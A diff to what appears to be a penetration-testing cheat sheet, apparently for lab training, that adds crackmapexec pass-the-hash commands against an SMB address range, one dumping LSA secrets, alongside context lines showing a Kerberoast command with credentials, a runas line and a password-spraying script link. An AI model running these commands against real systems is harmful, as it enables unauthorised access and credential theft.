@@ -245,6 +245,16 @@ https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source
 ```
 https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
 
+### Access Validation 
+-> crackmapexec
+```
+crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> -d <domain> --continue-on-success
+```
+or  
+```
+crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> --local-auth --lsa   
+```
+
 ### Kerberoast
 ```
 impacket-GetUserSPNs offsec.local/nathan:abc123// -dc-ip 192.168.135.57 -request
@@ -259,7 +269,6 @@ or
 ```
 runas /user:offsec\allison cmd.exe
 ```
-
 
 ### Bypass UAC
 #### EventViewer
